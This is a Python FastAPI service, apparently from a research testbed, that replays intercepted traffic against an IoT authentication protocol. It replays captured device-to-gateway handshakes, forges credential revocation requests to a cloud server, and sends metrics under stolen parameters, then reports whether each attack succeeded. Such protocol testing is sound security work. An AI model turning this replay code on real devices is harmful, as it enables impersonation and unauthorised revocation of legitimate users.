import os
import json
import time
import socket
import logging
import base64
import random

from fastecdsa import keys
from fastecdsa.curve import P256

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto import Random

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

# Configuración del logger
logging.basicConfig(
    level=logging.INFO,
    format="MAPFS time=%(asctime)s level=%(levelname)s msg=\'%(message)s\'",
    handlers=[logging.FileHandler("/logs/ATTACK-replicate.log"), logging.StreamHandler()],
)
logger = logging.getLogger("Sniffer-Replicate")

# Configurar FastAPI
app = FastAPI()

# Configuración volumen
SHARED_DIR = "/shared_data"
PROCESSED_DIR = os.path.join(SHARED_DIR, "processed")
POLL_INTERVAL = 120  # Segundos entre verificaciones de nuevos archivos
MIN_FILE_SIZE = 1024

# Variable global para el archivo actual
current_file = ""

# Diccionario para almacenar los parámetros obtenidos
intercepted_parameters = {}
ip_role_mapping = {}

gateway_host_mapfs = "mapfs-gateway"

def find_analysis_files():
    """Busca archivos de análisis no procesados con tamaño mayor a 1KB"""
    MIN_FILE_SIZE = 1024  # 1 KB en bytes

    # Lista de archivos que cumplen con los criterios
    valid_files = [
        f
        for f in os.listdir(SHARED_DIR)
        if f.endswith(".analysis.json")
        and not f.endswith(".processed")
        and not f.endswith(".failed")
        and os.path.getsize(os.path.join(SHARED_DIR, f)) > MIN_FILE_SIZE
    ]

    # Ordenar por fecha de modificación (más antiguos primero)
    return sorted(
        valid_files, key=lambda x: os.path.getmtime(os.path.join(SHARED_DIR, x))
    )


def extract_parameters_from_analysis():
    """
    Lee un archivo de análisis y extrae los parámetros en un diccionario estructurado por origen (src).

    Args:
        file_path (str): Ruta del archivo JSON de análisis.

    Returns:
        dict: Diccionario con los parámetros extraídos, organizados por origen.
    """
    global current_file, intercepted_parameters, ip_role_mapping
    try:
        with open(current_file) as f:
            analysis = json.load(f)

        # Extraer comunicaciones y mapeo
        comms = analysis.get("comms", {})
        ip_role_mapping = analysis.get("ip_role_mapping", {})

        # Iterar sobre cada comunicación (ej: "device->gateway", "gateway->device")
        for comm_key, messages in comms.items():
            for comm in messages:
                src_ip = comm.get("src_ip")
                payload = comm.get("payload", {})

                # Obtener el rol del src_ip desde ip_role_mapping
                src_role = ip_role_mapping.get(src_ip, {}).get("host", src_ip)

                # Crear la estructura base si no existe
                if src_role not in intercepted_parameters:
                    intercepted_parameters[src_role] = {}

                # Extraer parámetros relevantes del payload
                for key, value in payload.items():
                    if key not in [
                        "operation",
                        "step",
                        "status",
                    ]:  # Ignorar campos no relevantes
                        intercepted_parameters[src_role][key] = value

        logger.info(f"Parámetros extraídos: {intercepted_parameters}")

        return intercepted_parameters

    except Exception as e:
        logger.error(
            f"Error extrayendo parámetros del archivo {current_file}: {str(e)}"
        )
        return None


def replicate_authentication(direction, gateway_host):
    """Replica la comunicación en el sentido indicado y exactamente en el orden registrado en el análisis"""
    global current_file
    logger.info(f"Replica la comunicación en el sentido indicado.")
    try:
        with open(current_file) as f:
            analysis = json.load(f)

        comms = analysis.get("comms", {})
        src_dst_communication = comms.get(direction, [])

        if not src_dst_communication:
            logger.warning(
                f"No se encontraron comunicaciones en la dirección {direction}."
            )
            # Marcar como fallido si no hay comunicaciones relevantes
            return False

        logger.info(f"Secuencia de mensajes {direction}: {src_dst_communication}")

        # Obtener configuración de conexión del primer paquete
        first_comm = src_dst_communication[0]
        gateway_port = first_comm.get("dst_port")

        # Replicación fiel de la secuencia
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15)
            try:
                logger.info(f"Conectando a {gateway_host}:{gateway_port}")
                s.connect((gateway_host, gateway_port))
                last_response = None

                for idx, comm in enumerate(src_dst_communication, 1):
                    payload = comm.get("payload", {})

                    # Enviar mensaje tal como fue capturado
                    logger.info(
                        f"[Paso {idx}] Enviando payload: {json.dumps(payload, default=str)}."
                    )
                    s.sendall(json.dumps(payload).encode())

                    # Recibir respuesta
                    response = s.recv(4096)
                    if not response:
                        logger.error(f"[Paso {idx}] Sin respuesta del servidor.")
                        # Marcar como fallido si no hay comunicaciones relevantes
                        return False

                    last_response = json.loads(response.decode())
                    logger.info(
                        f"[Paso {idx}] Respuesta recibida: {json.dumps(last_response, default=str)}"
                    )

                    # Pequeña pausa entre pasos
                    time.sleep(0.5)

                # Verificar última respuesta
                if last_response and last_response.get("status") == "success":
                    logger.info("Réplica completada exitosamente.")
                    return True

                logger.error("La réplica no finalizó correctamente.")

            except socket.timeout:
                logger.error("Timeout en la comunicación con el Gateway.")
                return False
            except Exception as e:
                logger.error(f"Error durante la réplica: {str(e)}")
                return False

    except Exception as e:
        logger.error(f"Error procesando archivo: {str(e)}")
        return False


def replicate_revocation(using_intercepted_parameters):
    """Envía una solicitud de revocación al Cloud con los parámetros P1 y P3."""
    global intercepted_parameters, ip_role_mapping
    try:
        logger.info(f"Envíando una solicitud de revocación al Cloud con datos legítimos.")
        # Crear el payload de revocación
        if using_intercepted_parameters:
            payload = {
                "operation": "identify_and_revoke",
                "P_1": intercepted_parameters.get("device").get("P_1"),
                "P_3": intercepted_parameters.get("device").get("P_3"),
            }
        else:
            logger.info(f"Envíando una solicitud de revocación al Cloud con datos aleatorios.")
            _, random_pub_key = keys.gen_keypair(P256)
            value = {"x": random_pub_key.x, "y": random_pub_key.y}
            payload = {
                "operation": "identify_and_revoke",
                "P_1": value,
                "P_3": value,
            }

        # Recorrer el diccionario
        for ip, data in ip_role_mapping.items():
            if data.get("host") == "cloud":
                cloud_host = ip
                cloud_port = data.get("port")
                break  # Salir del bucle al encontrar la coincidencia

        # Conectar al Cloud y enviar la solicitud
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)  # Timeout de 10 segundos
            logger.info(f"Conectando al Cloud en {cloud_host}:{cloud_port}")
            s.connect((cloud_host, cloud_port))

            # Enviar la solicitud
            logger.info(
                f"Enviando solicitud de revocación: {json.dumps(payload, default=str)}"
            )
            s.sendall(json.dumps(payload).encode())
            response = s.recv(4096)
            last_response = json.loads(response.decode())
            if last_response.get("status") == "failed" or last_response.get("status") == "error":
                logger.info("La solicitud de revocación no fue procesada exitosamente.")
                return False
            else:
                logger.info("Solicitud de revocación enviada exitosamente.")            
                return True

    except socket.timeout:
        logger.error("Timeout al conectar con el Cloud.")
        return False
    except Exception as e:
        logger.error(f"Error enviando solicitud de revocación: {str(e)}")
        return False


def replicate_send_metrics():
    """Envía una solicitud de métricas cifradas al Gateway con los parámetros A y W."""
    global intercepted_parameters, ip_role_mapping
    logger.info(f"Envía una solicitud de métricas cifradas al Gateway.")
    try:
        # Generar datos simulados del sensor
        sensor_data = {
            "temperature": round(random.uniform(20.0, 30.0), 2),
            "humidity": round(random.uniform(50, 70), 2),
        }

        # Serializar las métricas a JSON
        metrics_json = json.dumps(sensor_data).encode("utf-8")

        # Generar IV aleatorio para CBC
        iv = Random.new().read(AES.block_size)

        # Generar una clave de sesión aleatoria (simulada)
        K_s_bytes = Random.new().read(16)  # Clave de 128 bits

        # Cifrar las métricas con AES en modo CBC
        cipher = AES.new(K_s_bytes, AES.MODE_CBC, iv)
        encrypted_metrics = cipher.encrypt(pad(metrics_json, AES.block_size))

        device_parameters = intercepted_parameters.get("device")
        gateway_parameters = intercepted_parameters.get("gateway")
        # Construir el payload
        payload = {
            "operation": "send_metrics",
            "ID_obfuscated": device_parameters.get("ID*"),
            "A": device_parameters.get("one_time_public_key"),
            "W": gateway_parameters.get("W"),
            "iv": base64.b64encode(iv).decode("utf-8"),
            "encrypted_metrics": base64.b64encode(encrypted_metrics).decode("utf-8"),
        }

        # Recorrer el diccionario
        for ip, data in ip_role_mapping.items():
            if data.get("host") == "gateway":
                gateway_host = ip
                gateway_port = data.get("port")
                break  # Salir del bucle al encontrar la coincidencia

        # Conectar al Gateway y enviar la solicitud
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)  # Timeout de 10 segundos
            logger.info(f"Conectando al Gateway en {gateway_host}:{gateway_port}")
            s.connect((gateway_host, gateway_port))

            # Enviar la solicitud
            logger.info(
                f"Enviando métricas cifradas: {json.dumps(payload, default=str)}"
            )
            s.sendall(json.dumps(payload).encode())
            response = s.recv(4096)
            last_response = json.loads(response.decode())
            if last_response.get("status") == "failed" or last_response.get("status") == "error":
                logger.info("Las métricas no han sido procesadas exitosamente.")
                return False
            else:
                logger.info("Métricas cifradas enviadas exitosamente.")            
                return True
    except socket.timeout:
        logger.error("Timeout al conectar con el Gateway.")
        return False
    except Exception as e:
        logger.error(f"Error enviando métricas cifradas: {str(e)}")
        return False


def mark_file_as_processed(success=True):
    """Renombra el archivo para marcarlo como procesado o fallido"""
    global current_file
    try:
        if success:
            new_path = current_file + ".processed"
        else:
            new_path = current_file + ".failed"

        os.rename(current_file, new_path)
        logger.info(f"Archivo marcado como {'procesado' if success else 'fallido'}.")
    except Exception as e:
        logger.error(f"Error marcando archivo: {str(e)}")

# Modelo de entrada
class ChoiceRequest(BaseModel):
    choice: str

@app.post("/execute")
def execute_choice(request: ChoiceRequest):
    """Ejecuta la acción seleccionada por el usuario."""
    global current_file
    choice = request.choice
    state = False

    if not current_file:
        files = find_analysis_files()
        if files:
            current_file = os.path.join(SHARED_DIR, files[0])
            logger.info(f"Archivo seleccionado: {current_file}")
            extract_parameters_from_analysis()

    if choice == "1":
        state = replicate_authentication("device->gateway", gateway_host_mapfs)
    elif choice == "2":
        state = replicate_send_metrics()
    elif choice == "3":
        state = replicate_revocation(True)
    elif choice == "4":
        state = replicate_revocation(False)
    elif choice == "5":
        return {"message": "Saliendo del servicio."}

    message = "El ataque fue exitoso." if state else "El ataque no ha sido exitoso."
    return {"message": message}

# Iniciar servicio al ejecutar
if __name__ == "__main__":
    os.makedirs("../../Logs/", mode=0o777, exist_ok=True)
    os.makedirs(SHARED_DIR, exist_ok=True)
    logger.info("Iniciando servicio de replicación.")
    uvicorn.run(app, host="0.0.0.0", port=8000)